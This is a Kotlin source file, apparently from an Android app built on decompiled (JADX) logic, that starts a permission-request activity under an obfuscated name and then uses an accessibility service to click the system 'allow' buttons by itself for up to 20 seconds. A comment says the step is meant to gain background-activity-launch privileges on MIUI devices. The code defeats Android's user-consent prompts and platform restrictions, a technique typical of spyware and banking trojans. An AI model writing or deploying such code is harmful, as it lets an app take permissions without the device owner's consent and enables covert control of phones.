package com.storm.safe.rock.service.modules.yw5xud.generic

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import com.storm.safe.rock.service.modules.yw5xud.common.umrkmgrri

/**
 * GenericBasicPerms — Request basic runtime permissions via yw5xud.umrkmgrri Activity.
 * Extracted from GenericSteps.executeBasicPermissions.
 *
 * JADX: m212130b0 — launches umrkmgrri, then loops 20s clicking allow buttons.
 * This is the KEY step that gives us BAL_ALLOW_VISIBLE_WINDOW via system
 * GrantPermissionsActivity dialog, enabling all subsequent startActivity calls
 * to reach the foreground on MIUI.
 */
class GenericBasicPerms(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: GenericSteps
) {
    companion object {
        private const val TAG = "GenericBasicPerms"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        // If umrkmgrri was already launched by MiuiSteps, skip
        if (umrkmgrri.isRequestingPermissions) {
            logs.add("[基础权限] umrkmgrri 已在运行中，等待完成")
            val startTime = System.currentTimeMillis()
            while (System.currentTimeMillis() - startTime < 20000L) {
                if (!umrkmgrri.isRequestingPermissions) break
                steps.interruptibleDelay(500L)
            }
            successes.add("基础权限请求已由品牌引擎处理")
            return
        }

        logs.add("[基础权限] 开始执行")
        UiDebugger.logStep(TAG, "Flow1: executeBasicPermissions 开始")
        try {
            // Step 1: Launch yw5xud.umrkmgrri (batch permission request)
            Log.i(TAG, "[基础权限] 启动umrkmgrri...")
            UiDebugger.dumpPage(service, "generic_basic_perms_before", "基础权限请求前")
            umrkmgrri.start(context)
            steps.interruptibleDelay(800L)

            // Step 2: Loop 20s clicking permission allow buttons
            val startTime = System.currentTimeMillis()
            val timeoutMs = 20000L
            var clickCount = 0
            Log.i(TAG, "[基础权限] 开始循环点击允许按钮 (超时=${timeoutMs / 1000}秒)...")

            while (System.currentTimeMillis() - startTime < timeoutMs) {
                if (steps.isPermissionControllerWindow()) {
                    if (steps.clickPermissionAllowButton()) {
                        clickCount++
                        Log.i(TAG, "[基础权限] 点击允许 (第${clickCount}次)")
                    }
                    steps.interruptibleDelay(800L)
                } else {
                    // Not on permission controller — check if umrkmgrri still running
                    if (!umrkmgrri.isRequestingPermissions) {
                        Log.i(TAG, "[基础权限] umrkmgrri 已完成")
                        break
                    }
                    steps.interruptibleDelay(500L)
                }
            }

            val elapsed = (System.currentTimeMillis() - startTime) / 1000
            Log.i(TAG, "[基础权限] 完成，用时${elapsed}秒，点击${clickCount}次")
            UiDebugger.dumpPage(service, "generic_basic_perms_after", "基础权限完成")
            successes.add("基础权限请求完成 (点击${clickCount}次)")
        } catch (e: Exception) {
            Log.e(TAG, "[基础权限] 异常: ${e.message}")
            failures.add("基础权限请求失败: ${e.message}")
        }
    }
}
